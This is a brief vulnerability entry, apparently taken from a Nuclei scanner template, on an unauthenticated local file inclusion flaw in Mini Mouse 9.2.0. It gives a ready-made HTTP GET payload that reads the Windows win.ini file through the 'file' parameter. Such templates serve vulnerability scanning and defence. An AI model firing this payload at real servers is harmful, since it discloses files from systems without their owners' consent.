# Vulnerability: Mini Mouse 9.2.0 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`minimouse-lfi.yaml`)

## Description
Mini Mouse 9.2.0 is vulnerable to local file inclusion because it allows remote unauthenticated attackers to include and disclose the content of locally stored files via the 'file' parameter.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/file=C:%5CWindows%5Cwin.ini
```

